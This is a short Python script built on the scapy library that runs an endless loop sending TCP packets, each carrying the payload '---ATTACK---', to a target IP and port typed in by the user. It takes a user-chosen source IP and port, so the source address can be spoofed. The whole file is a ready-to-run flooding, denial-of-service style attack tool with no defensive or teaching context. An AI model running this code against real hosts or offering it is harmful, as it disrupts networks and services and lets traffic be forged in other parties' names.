import scapy.all as scapy


def attack(src_ip, src_port, dst_ip, dst_port):
	try:
		while True:
			packet = scapy.IP()/scapy.TCP()/scapy.Raw()
			packet.src = src_ip
			packet.sport = int(src_port)
			packet.dst = dst_ip
			packet.dport = int(dst_port)

			packet.load = "---ATTACK---"
			scapy.send(packet)
	except KeyboardInterrupt:
		print("Attack finished")


if __name__ == '__main__':
	source_ip = input("Type source IP: ")
	source_port = input("Type source port: ")
	target_ip = input("Type target IP: ")
	target_port = input("Type target port: ")

	attack(source_ip, source_port, target_ip, target_port)
